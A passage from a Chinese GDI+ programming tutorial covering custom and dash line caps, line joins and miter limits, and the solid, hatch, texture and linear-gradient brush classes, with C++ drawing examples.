&#33258;&#23450;&#20041;&#32447;&#24125;&#10;&#125; LineCap;</span><br></pre></td></tr></table></figure>
<p>自定义线帽，需要用到 GDI+专门为此定义的类 CustomLineCap。其构造函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CustomLineCap(const GraphicsPath *fillPath, const GraphicsPath *strokePath, LineCap baseCap, REAL baseInset);</span><br></pre></td></tr></table></figure>
<p>其中要用到图形路径类 GraphicsPath，该类中有图形各种添加图形方法，只是把 Graphics 类</p>
<p>绘图方法名中的 Draw 改成 Add 即可。例如：AddLine、AddRectangle 和 AddPolygon 等。使 用时，可以先创建一个空路径，然后调用这些添加图形方法若干次，就可以生成路径了。</p>
<p><img src="../img/gdip-编程基础/Image_038.jpg" alt="image"></p>
<p>例如（各类线帽，参见图 14-23 和图 14-24）：</p>
<p><img src="../img/gdip-编程基础/Image_039.jpg" alt="image"></p>
<p>箭头线帽 构造箭头线帽头尾所使用的坐标系 </p>
<p>图 14-23 自定义线帽</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// &#33258;&#23450;&#20041;&#31661;&#22836;&#32447;&#24125;&#10;GraphicsPath startPath, endPath; // &#21019;&#24314;&#36215;&#28857;&#21644;&#32456;&#28857;&#36335;&#24452;&#23545;&#35937;&#10;startPath.AddRectangle(Rect(-10, -5, 20, 10)); // &#36215;&#28857;&#30697;&#24418;&#10;Point polygonPoints[4] = &#123;Point(0, -20), Point(10, 0),&#10;Point(0, -10), Point(-10, 0)&#125;;&#10;endPath.AddPolygon(polygonPoints, 4); // &#32456;&#28857;&#31661;&#22836; &#10;CustomLineCap startCap(NULL, &#38;startPath); // &#21019;&#24314;&#36215;&#28857;&#32447;&#24125; &#10;CustomLineCap endCap(NULL, &#38;endPath); // &#21019;&#24314;&#32456;&#28857;&#32447;&#24125;&#10;// &#23450;&#20041;&#31508;&#10;Pen pen(Color::Black, 20); // &#30011;&#24102;&#32447;&#24125;&#31895;&#32447;&#30340;&#40657;&#31508;&#10;Pen redPen(Color::Red); // &#30011;&#19981;&#24102;&#32447;&#24125;&#32454;&#32447;&#30340;&#32418;&#31508;&#10;// &#20013;&#33521;&#25991;&#32447;&#24125;&#23383;&#31526;&#20018;&#25968;&#32452;&#10;CString cstrs[] = &#123;L&#34;&#24179;&#32447;&#24125;&#34;, L&#34;&#26041;&#32447;&#24125;&#34;, L&#34;&#22278;&#32447;&#24125;&#34;, L&#34;&#19977;&#35282;&#32447;&#24125;&#34;,&#10;L&#34;&#26080;&#38170;&#32447;&#24125;&#34;, L&#34;&#26041;&#38170;&#32447;&#24125;&#34;, L&#34;&#22278;&#38170;&#32447;&#24125;&#34;, L&#34;&#33777;&#38170;&#32447;&#24125;&#34;, L&#34;&#31661;&#38170;&#32447;&#24125;&#34;, L&#34;&#23450;&#21046;&#32447;&#24125;&#34;&#125;;&#10;CString estrs[] = &#123;L&#34;LineCapFlat&#34;, L&#34;LineCapSquare&#34;,&#10;    L&#34;LineCapRound&#34;, L&#34;LineCapTriangle&#34;, L&#34;LineCapNoAnchor&#34;, L&#34;LineCapSquareAnchor&#34;, &#10;    L&#34;LineCapRoundAnchor&#34;, L&#34;LineCapDiamondAnchor&#34;, L&#34;LineCapArrowAnchor&#34;, &#10;    L&#34;LineCapCustom&#34;&#125;;&#10;// &#21019;&#24314;&#23383;&#20307;&#10;FontFamily fontFamily(L&#34;Times New Roman&#34;); // &#23545;&#24212;&#20013;&#25991;&#30340;&#34;&#23435;&#20307;&#34; &#10;Font font(&#38;fontFamily, 10.5); // &#20116;&#21495;&#23383;&#10;// &#32472;&#21046;&#21508;&#31181;&#32447;&#24125;&#10;Graphics graph(pDC-&#38;gt;m_hDC);&#10;for (int i = 0; i &#38;lt;= 9; i++) &#123; &#10;    // &#30011;&#32447;&#24490;&#29615;&#10;    LineCap lc = (LineCap)(i &#38;lt; 4 ? i : i + 12); // &#32447;&#24125;&#24120;&#37327;&#65288;&#25972;&#25968;&#65289; &#10;    if(i &#38;lt; 9) &#10;        pen.SetLineCap(lc, lc, DashCapFlat); // &#26631;&#20934;&#32447;&#24125; &#10;    else &#10;    &#123; &#10;        // &#33258;&#23450;&#20041;&#32447;&#24125;&#65288;i = 9&#65289;&#10;        pen.SetCustomStartCap(&#38;startCap); // &#35774;&#32622;&#33258;&#23450;&#20041;&#30340;&#36215;&#28857;&#32447;&#24125; &#10;        pen.SetCustomEndCap(&#38;endCap); // &#35774;&#32622;&#33258;&#23450;&#20041;&#30340;&#32456;&#28857;&#32447;&#24125; &#10;        pen.SetWidth(3.0f); // &#37325;&#26032;&#35774;&#32622;&#32447;&#23485;&#20026; 3 &#20010;&#20687;&#32032;&#10;    &#125;&#10;    int y = 20 + i * 40; // &#35745;&#31639;&#30452;&#32447;&#30340;&#22402;&#30452;&#22352;&#26631; &#10;    graph.DrawLine(&#38;pen, 100, y, 400, y); // &#30011;&#24102;&#32447;&#24125;&#30340;&#31895;&#32447; &#10;    graph.DrawLine(&#38;redPen, 100, y, 400, y); // &#30011;&#19981;&#24102;&#32447;&#24125;&#30340;&#32454;&#32447;&#10;    // &#32472;&#21046;&#20013;&#33521;&#25991;&#32447;&#24125;&#23383;&#31526;&#20018;&#10;    graph.DrawString(cstrs[i], -1, &#38;font,&#10;    PointF(15.0f, y - 8.0f), &#38;brush); &#10;    graph.DrawString(estrs[i], -1, &#38;font,&#10;    PointF(425.0f, y - 8.0f), &#38;brush);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_040.png" alt="image"></p>
<p>图 14-24 线帽的种类 图 14-25 箭头线帽的旋转直线簇 又例如（旋转箭头线帽，参见图 14-25）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// startCap &#21644; endCap &#30340;&#21019;&#24314;&#21516;&#19978;&#20363;&#65292;&#38656;&#21253;&#21547;&#22836;&#25991;&#20214; &#38;lt;math.h&#38;gt;&#10;Pen pen(Color::DarkGreen, 2); &#10;pen.SetCustomStartCap(&#38;startCap); &#10;pen.SetCustomEndCap(&#38;endCap);&#10;double radian = 3.14159265358979323846 / 180.0;&#10;for (int i = 0; i &#38;lt; 360; i += 10) &#10;    graph.DrawLine(&#38;pen, 220, 220, 220 + (INT) (200 *&#10;        cos(i * radian)), 220 + (INT) (200 * sin(i * radian)));</span><br></pre></td></tr></table></figure>
<p>方法 SetLineCap 的最后一个输入参数 DashCap dashCap，用于设置虚线内部各线段端点 的形状。其取值是枚举类型（GdiplusEnums.h）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    DashCapFlat = 0, // &#24179;&#32447;&#65288;&#40664;&#35748;&#20540;&#65289; &#10;    DashCapRound = 2, // &#22278;&#24418; &#10;    DashCapTriangle = 3 // &#19977;&#35282;&#10;&#125; DashCap;</span><br></pre></td></tr></table></figure>
<p>可见，只有三种选择：平、圆和三角。之所以枚举常量所对应的值不连续，是因为要同 LineCap 枚举的对应常量一致。</p>
<p>注意，虚线帽的设置，只影响其虚线内部的线段，不会影响整条虚线的头尾形状，它们 是由 SetLineCap 方法的前两个参数来分别设置的。例如（参见图 14-26）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;Pen pen(Color::Black, 10);&#10;pen.SetLineCap(LineCapFlat, LineCapFlat, **DashCapFlat**);&#10;//pen.SetLineCap(LineCapFlat, LineCapFlat, **DashCapRound**);&#10;//pen.SetLineCap(LineCapFlat, LineCapFlat, **DashCapTriangle**); &#10;REAL dashVals[4] = &#123;5.0f, 2.0f, 15.0f, 4.0f&#125;;&#10;for (int i = 0; i &#38;lt;= 5; i++) &#10;&#123;&#10;    pen.SetDashStyle((DashStyle)i);&#10;    if (i == 5) &#10;        pen.SetDashPattern(dashVals, 4);&#10;    graph.DrawLine(&#38;pen, 10, 10 + i * 20, 400, 10 + i * 20);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_041.jpg" alt="image"></p>
<p>DashCapRound 圆虚线帽</p>
<p><img src="../img/gdip-编程基础/Image_042.jpg" alt="image"></p>
<p>DashCapFlat 平虚线帽</p>
<p><img src="../img/gdip-编程基础/Image_043.jpg" alt="image"></p>
<p>DashCapTriangle 三角虚线帽 </p>
<p>图 14-26 虚线帽</p>
<p>（5）线连接</p>
<p>笔的线连接（join）属性，也是 GDI+新增的功能。可以使用 Pen 类的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetLineJoin( LineJoin lineJoin);</span><br></pre></td></tr></table></figure>
<p>来设置笔的线连接属性。其中输入参数为枚举类型 LineJoin： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum LineJoin &#123;&#10;    LineJoinMiter = 0, // &#26012;&#25509;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    LineJoinBevel = 1, // &#26012;&#25130;&#10;    LineJoinRound = 2, // &#22278;&#35282;&#10;    LineJoinMiterClipped = 3 // &#26012;&#21098;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>例如（参见图 14-27）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;Pen pen(Color::DarkGreen, 40); &#10;for (int i = 0; i &#38;lt; 4; i++) &#10;&#123;&#10;    pen.SetLineJoin((LineJoin)i);&#10;    graph.DrawRectangle(&#38;pen, 40 + i * 150, 40, 100, 100);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_044.jpg" alt="image"></p>
<p>LineJoinMiter LineJoinBevel LineJoinRound LineJoinMiterClipped</p>
<p>斜接 斜截 圆角 斜剪 </p>
<p>图 14-27 线连接</p>
<p>从该例还看不出斜剪与斜接有什么区别，因为斜剪 LineJoinMiterClipped 主要针对交角 很小，相交部分很长的情形。在斜剪线连接方式下，可以调用 Pen 类的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetMiterLimit(REAL miterLimit);</span><br></pre></td></tr></table></figure>
<p>来设置相交部分的最大限制长度，默认是 10.0（相对于线宽的比值）。</p>
<p>对 LineJoinMiterClipped 方式的线连接，如果 miterLimit &lt; 相交部分的长度，则会截断 至线头（同斜截方式，相当于 miterLimit = 1.0）；如果 miterLimit &gt;= 相交部分的长度，则绘 制完整的相交部分。</p>
<p>但是对 LineJoinMiter 方式的线连接，如果 miterLimit &lt; 相交部分的长度，则会截断至</p>
<p>miterLimit 所指定比例的长度；如果 miterLimit &gt;= 相交部分的长度，则绘制完整的相交部分。 例如（参见图 14-28）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;Pen redPen(Color::Red); // &#30011;&#32454;&#32447;&#30340;&#32418;&#31508;&#10;Pen pen(Color::DarkGreen, 40.0f); // &#30011;&#31895;&#32447;&#30340;&#32511;&#33394;&#31508;&#10;Point points[] = &#123;Point(20, 100), Point(400, 130),&#10;Point(20, 160)&#125;; // &#28857;&#25968;&#32452;&#10;pen.SetLineJoin(LineJoinMiter); // &#26012;&#25509;&#10;//pen.SetLineJoin(LineJoinBevel); // &#26012;&#25130;&#10;//pen.SetLineJoin(LineJoinRound); // &#22278;&#35282;&#10;//pen.SetLineJoin(LineJoinMiterClipped); // &#26012;&#21098;&#10;//pen.SetMiterLimit(20.0f); // &#35774;&#32622;&#26012;&#25509;&#38480;&#38271; &#10;graph.DrawLines(&#38;pen, points, 3); // &#30011;&#31895;&#32447; &#10;graph.DrawLines(&#38;redPen, points, 3); // &#30011;&#32454;&#32447;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_045.png" alt="image"></p>
<p>图 14-28 小交角线连接 图 14-29 不同斜接限长下的斜接线连接 如果不断修改斜接线连接 LineJoinMiter 方式下的线长限制（0.0f~13.0f），则可得到不同</p>
<p>截断长度的斜交角。例如（参见图 14-29）： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pen.SetLineJoin(LineJoinMiter); // &#26012;&#25509; &#10;pen.SetMiterLimit(1.0f/*~13.0f*/); // &#35774;&#32622;&#26012;&#25509;&#38480;&#38271;</span><br></pre></td></tr></table></figure>
<h3 id="1-7-2_刷">1.7.2 刷</h3><p>与 GDI 中的一样，GDI+中的刷（brush）也是画填充图的工具，GDI+中也有与 GDI 相 对应的实心刷（单色刷）、条纹刷（影线刷）和纹理刷（图像刷）。不过，GDI+又新增加了 功能强大的线性渐变刷和路径渐变刷，而且还为所有这些刷各自建立了对应的类，基类是Brush（功能少）。</p>
<p><img src="../img/gdip-编程基础/Image_046.png" alt="image"></p>
<p>图 14-30 是 GDI+中各种刷类的层次结构图， 所有刷类都被定义在头文件 Gdiplus Brush.h 中。</p>
<p>（1）刷基类 Brush</p>
<p><img src="../img/gdip-编程基础/1-7-2-1.png" alt=""></p>
<p>Brush 是所有 GDI+具体刷类的基类，Brush 类没有自己的公用构造函数，属于非实例化</p>
<p>类（用户不能创建 Brush 类的对象和实例），只是定义了三个公用的方法（接口）： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Brush *Clone( VOID) const; // &#20811;&#38534;&#65292;&#29992;&#20110;&#22797;&#21046; Brush &#21450;&#20854;&#27966;&#29983;&#31867;&#23545;&#35937; Status &#10;GetLastStatus(VOID); // &#33719;&#21462;&#26368;&#21518;&#29366;&#24577;&#65292;&#36820;&#22238;&#21047;&#23545;&#35937;&#26368;&#36817;&#30340;&#38169;&#35823;&#29366;&#24577;&#10;BrushType GetType(VOID); // &#33719;&#21462;&#31867;&#22411;&#65292;&#36820;&#22238;&#24403;&#21069;&#65288;&#27966;&#29983;&#65289;&#21047;&#30340;&#31867;&#22411;&#26522;&#20030;&#24120;&#37327;</span><br></pre></td></tr></table></figure>
<p>下面是 BrushType 枚举类型的定义（GdiplusEnums.h）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    BrushTypeSolidColor = 0, // &#23454;&#24515;&#21333;&#33394;&#21047; &#10;    BrushTypeHatchFill = 1, // &#24433;&#32447;&#26465;&#32441;&#22635;&#20805;&#21047; &#10;    BrushTypeTextureFill = 2, // &#22270;&#20687;&#32441;&#29702;&#22635;&#20805;&#21047; &#10;    BrushTypePathGradient = 3, // &#36335;&#24452;&#28176;&#21464;&#21047; &#10;    BrushTypeLinearGradient = 4 // &#32447;&#24615;&#28176;&#21464;&#21047;&#10;&#125; BrushType;</span><br></pre></td></tr></table></figure>
<p>（2）实心刷类 SolidBrush</p>
<p>GDI+中，实心的单色刷对应于 SolidBrush 类，它只有一个构造函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SolidBrush(const Color &#38;color);</span><br></pre></td></tr></table></figure>
<p>输入参数为颜色对象的引用。</p>
<p>在前面的例子中已经多次使用了 SolidBrush 类，下面再举一个画正叶曲线的例子，下面 是正叶曲线的极坐标方程及其到直角坐标系的转换公式：</p>
<p><img src="../img/gdip-编程基础/1-7-2-2.png" alt="image"></p>
<p>其中，l 为叶片长度、n 为叶片数目。</p>
<p>因为 GDI+并没有画正叶曲线的专门函数，所以需要用多边形、样条曲线或图形路径来 刻画它。可以使用填充多边形、填充封闭曲线和填充图形路径等方式来进行绘制，下面的代码使用的是填充闭基样条曲线，输出结果如图 14-31 所示。</p>
<ul>
<li><p>绘制单个正叶曲线的函数代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#60;math.h&#62;&#10;void DrawLeaves(Graphics &#38;graph, const Color col, Point &#38;O,&#10;    int l, int n) &#123;&#10;    double radian = 3.14159265358979323846 / 180.0; &#10;    int m = n &#60; 5 ? 21 : 11;&#10;    int N = m * n;&#10;    double da = 360.0 / N; PointF *ps = new PointF[N];&#10;    for (int i = 0; i &#38;lt; N; i++) &#123;&#10;        double r = abs(l * cos(radian * (n * i * da)/ 2.0)), &#10;            x = r * cos(i * da * radian),&#10;            y = r * sin(i * da * radian);&#10;        ps[i].X = REAL(O.X + x);&#10;        ps[i].Y = REAL(O.Y + y);&#10;    &#125;&#10;    graph.FillClosedCurve(&#38;SolidBrush(col), ps, N);&#10;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>绘制系列彩色正叶曲线的调用序列：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;Color cols[] = &#123;Color::Aqua, Color::Aquamarine, Color::DarkBlue, Color::DarkKhaki, &#10;    Color::DeepPink, Color::BlueViolet, Color::Brown, Color::BurlyWood, Color::CadetBlue, &#10;    Color::Chartreuse, Color::Turquoise, Color::Coral, Color::CornflowerBlue, &#10;    Color::Crimson, Color::DarkCyan&#125;;&#10;bool color = true; // false; &#10;for (int i = 0; i &#38;lt; 15; i++)&#10;    DrawLeaves(graph, color ? cols[i] : Color::Green,&#10;        Point(100 + 200* (i % 5), 100 + 200 * (i / 5)), 100, i + 1);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_048.jpg" alt="image"></p>
<p>图 14-31 彩色正叶曲线系列</p>
<p>（3）条纹刷类 HatchBrush</p>
<p>条纹是一种重复填充的小方形图案，一般为横线、竖线、斜线和小方块等构成。GDI+ 中，条纹刷（hatch brush 影线刷/阴影刷）对应于 HatchBrush 类，它也只有一个构造函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HatchBrush(HatchStyle hatchStyle, const Color &#38;foreColor, const Color &#38;backColor = Color());</span><br></pre></td></tr></table></figure></p>
<p>其中：第一个参数为条纹类型，第二个参数为前景色（条纹色），第三个参数为背景色（空隙色）。</p>
<p>GDI+中一共有 53 种条纹风格，而 GDI 中只有前 6 种。条纹风格枚举 HatchStyle 也被定 义在头文件 GdiplusEnums.h 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum HatchStyle &#123;&#10;    HatchStyleHor izontal, // 0&#65306;&#27178;&#32447;&#10;    HatchStyleVertical, // 1&#65306;&#31446;&#32447;&#10;    HatchStyleForwardDiagonal, // 2&#65306;&#27491;&#26012;&#32447;&#10;    HatchStyleBackwardDiagonal, // 3&#65306;&#21453;&#26012;&#32447;&#10;    HatchStyleCross, // 4&#65306;&#21313;&#23383;&#32447;&#10;    HatchStyleDiagonalCross, // 5&#65306;&#26012;&#21313;&#23383;&#32447;&#10;    HatchStyle05Percent, // 6&#65306;5%&#10;    HatchStyle10Percent, // 7&#65306;10%&#10;    ...&#10;    HatchStyleSphere, // 47&#65306;&#29699;&#38754;&#10;    HatchStyleSmallGrid, // 48&#65306;&#23567;&#32593;&#26684;&#10;    HatchStyleSmallChecker Board, // 49&#65306;&#23567;&#36339;&#26827;&#30424;&#10;    HatchStyleLargeCheckerBoard, // 50&#65306;&#22823;&#36339;&#26827;&#30424;&#10;    HatchStyleOutlinedDiamond, // 51&#65306;&#26012;&#32434;&#32447;&#10;    HatchStyleSolidDiamond, // 52&#65306;&#23454;&#33777;&#24418; HatchStyleTotal, // = 53&#65288;0 ~ 52&#65289;&#65306;&#26465;&#32441;&#39118;&#26684;&#24635;&#25968; HatchStyleLargeGrid = HatchStyleCross, // 4&#65306;&#22823;&#32593;&#26684;&#10;    HatchStyleMin = HatchStyleHorizontal, // 0&#65306;&#26465;&#32441;&#39118;&#26684;&#26368;&#23567;&#20540; HatchStyleMax = HatchStyleTotal - 1, // 52&#65306;&#26465;&#32441;&#39118;&#26684;&#26368;&#22823;&#20540;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>例如（参见图 14-32）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); Pen pen(Color::Black);&#10;SolidBrush textBrush(Color::Red);&#10;FontFamily fontFamily(L&#34;Times New Roman&#34;); &#10;Font font(&#38;fontFamily, 18);&#10;CString str;&#10;StringFormat sfmt; // &#25991;&#26412;&#26684;&#24335; &#10;sfmt.SetAlignment(StringAlignmentCenter); // &#27700;&#24179;&#23545;&#40784; &#10;sfmt.SetLineAlignment(StringAlignmentCenter); // &#22402;&#30452;&#23545;&#40784;&#10;int w = 50, h = 50, s = 5;&#10;for (int i = 0; i &#38;lt; 53; i++) &#123; // &#20027;&#24490;&#29615;&#10;    HatchBrush brush(HatchStyle(i), Color::Black, Color::White); &#10;    RectF rect(REAL(s + (i % 10) * (w + s)),&#10;    REAL(s + (i / 10) * (h + s)), REAL(w), REAL(h));&#10;    graph.FillRectangle(&#38;brush, rect); // &#30011;&#26465;&#32441;&#22359; &#10;    str.Format(L&#34;%d&#34;, i); // &#32472;&#21046;&#25968;&#23383;&#32534;&#21495;&#30340;&#25991;&#26412;&#20018;&#65306; &#10;    graph.DrawString(str, str.GetLength(), &#38;font, rect,&#10;        &#38;sfmt, &#38;textBrush);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_049.jpg" alt="image"></p>
<p>图 14-32 条纹刷的条纹风格</p>
<p>与 GDI 一样，在 GDI+中也可以调整条纹刷和图像刷的起点。这需要使用图像类 Graphics 的方法 SetRenderingOrigin 来设置渲染原点为(x, y)（默认为(0, 0)）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetRenderingOrigin(INT x, INT y);</span><br></pre></td></tr></table></figure>
<p>（4）纹理刷类 TextureBrush</p>
<p>纹理刷（texture brush）就是图像刷，它将刷中所装入的图像，在目标区域中进行平铺， 可达到纹理效果。GDI 中也有图像刷，但仅限于使用位图资源和（非常费事才能使用）BMP 文件。在 GDI+中，纹理刷所对应的是 TextureBrush 类，它有 7 个构造函数，最常用的为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TextureBrush(Image* image, WrapMode wrapMode = WrapModeTile);</span><br></pre></td></tr></table></figure>
<p>其中，第一个参数是图像对象的指针，第二个参数是排列方式的枚举常量（GdiplusEnums.h）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    WrapModeTile = 0, // &#24179;&#38138;&#65288;&#29926;&#65289;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    WrapModeTileFlipX = 1, // &#24179;&#38138;&#19988; X &#21521;&#32763;&#36716;&#65288;&#30456;&#37051;&#21015;&#24038;&#21491;&#32763;&#36716;&#65289; &#10;    WrapModeTileFlipY = 2, // &#24179;&#38138;&#19988; Y &#21521;&#32763;&#36716;&#65288;&#30456;&#37051;&#34892;&#19978;&#19979;&#32763;&#36716;&#65289; &#10;    WrapModeTileFlipXY = 3, // &#24179;&#38138;&#19988; XY &#21521;&#32763;&#36716;&#65288;&#30456;&#37051;&#34892;&#21015;&#24038;&#21491;&#19978;&#19979;&#32763;&#36716;&#65289; &#10;    WrapModeClamp = 4 // &#19981;&#24179;&#38138;&#65288;&#19981;&#37325;&#22797;&#65292;&#22841;&#20303;&#65289;&#10;&#125; WrapMode;</span><br></pre></td></tr></table></figure>
<p>还可以用纹理刷类的下面两个方法来设置和获取刷的排列方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetWrapMode(WrapMode wrapMode); WrapMode GetWrapMode() const;</span><br></pre></td></tr></table></figure>
<p>例如（参见图 14-33）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;Image img(L&#34;&#24352;&#19996;&#20581;.bmp&#34;);&#10;TextureBrush brush(&#38;img, WrapModeTile/*FlipXY*/);&#10;//TextureBrush brush(&#38;img, **WrapModeClamp**); &#10;RECT rect;&#10;GetClientRect(&#38;rect);&#10;graph.FillRectangle(&#38;brush, RectF(0.0f, 0.0f, REAL(rect.right), REAL(rect.bottom)));</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_050.jpg" alt="image"></p>
<p>平铺（WrapModeTile）</p>
<p><img src="../img/gdip-编程基础/Image_051.jpg" alt="image"></p>
<p>平铺且 X 向翻转（WrapModeTileFlipX）</p>
<p><img src="../img/gdip-编程基础/Image_052.jpg" alt="image"></p>
<p>平铺且 Y 向翻转（WrapModeTileFlipY）</p>
<p><img src="../img/gdip-编程基础/Image_053.jpg" alt="image"></p>
<p>平铺且 XY 向翻转（WrapModeTileFlipXY）</p>
<p><img src="../img/gdip-编程基础/Image_054.jpg" alt="image"></p>
<p>不平铺（WrapModeClamp） </p>
<p>图 14-33 纹理刷排列方式</p>
<p>纹理刷类 TextureBrush 中，还有几个方法，可以对刷中的图像进行平移（translate）、旋 转（rotate）和缩放（scale）等变换（transform）（这是 GDI 里所没有的功能）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status TranslateTransform(REAL dx, REAL dy, MatrixOrder order = MatrixOrderPrepend); &#10;Status RotateTransform(REAL angle, MatrixOrder order = MatrixOrderPrepend) ;&#10;Status ScaleTransform(REAL sx, REAL sy, MatrixOrder order = MatrixOrderPrepend);</span><br></pre></td></tr></table></figure>
<p>例如（参见图 14-34）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); Image img(L&#34;&#24352;&#19996;&#20581;.bmp&#34;); &#10;TextureBrush brush(&#38;img);&#10;//brush.TranslateTransform(30, 30); // &#24179;&#31227;(30, 30)&#10;brush.RotateTransform(30); // &#26059;&#36716; 30 &#24230;&#10;//brush.ScaleTransform(3, 1); // &#27700;&#24179;&#25918;&#22823; 3 &#20493;&#10;//brush.ScaleTransform(1, 3); // &#22402;&#30452;&#25918;&#22823; 3 &#20493;&#10;RECT rect; &#10;GetClientRect(&#38;rect);&#10;graph.FillRectangle(&#38;brush, RectF(0.0f, 0.0f, REAL(rect.right), REAL(rect.bottom)));</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_055.jpg" alt="image"></p>
<p>平移(30, 30)</p>
<p><img src="../img/gdip-编程基础/Image_056.jpg" alt="image"></p>
<p>旋转 30 度</p>
<p><img src="../img/gdip-编程基础/Image_057.jpg" alt="image"></p>
<p>水平放大 3 倍</p>
<p><img src="../img/gdip-编程基础/Image_058.jpg" alt="image"></p>
<p>垂直放大 3 倍</p>
<p>图 14-34 纹理刷变换</p>
<p>（5）线性渐变刷类 LinearGradientBrush</p>
<p>线性渐变刷（linear gradient brush 线性梯度刷）使用逐渐变化的颜色填充目标区域。是 GDI+新增的功能。线性渐变刷所对应的类为 LinearGradientBrush，它有 6 个构造函数，前 3 个是整数版，后 3 个是对应的浮点数版。下面是 3 个整数版的构造函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinearGradientBrush(const Point&#38; point1, const Point&#38; point2, const Color&#38; color1, const Color&#38; color2);&#10;LinearGradientBrush(const Rect&#38; rec t, const Color&#38; color1, const Color&#38; color2, LinearGradientMode mode);&#10;LinearGradientBrush(const Rect&#38; rect, const Color&#38; color1, const Color&#38; color2, REAL angle, BOOL is AngleScalable = FALSE);</span><br></pre></td></tr></table></figure>
<p>在这三种构造函数中，第一个是点到点、第二个是矩形与渐变模式、第三个是是矩形与旋转角度。限于篇幅，这里只介绍其中点到点的整数版构造函数的具体使用方法。</p>
<p>1）点到点渐变</p>
<p>点到点的渐变是指刷子所填充的颜色，沿着点 point1 到点 point2 的直线，从颜色 color1 连续变化到 color2。若 p1 和 p2 点的 y 值相等，则为水平方向的渐变；若 p1 和 p2 点的 x 值 相等，则为垂直方向的渐变；p1 和 p2 点的 x 和 y 值都不相等，则为斜对角方向的渐变。</p>
<p>例如（参见图 14-35）：</p>
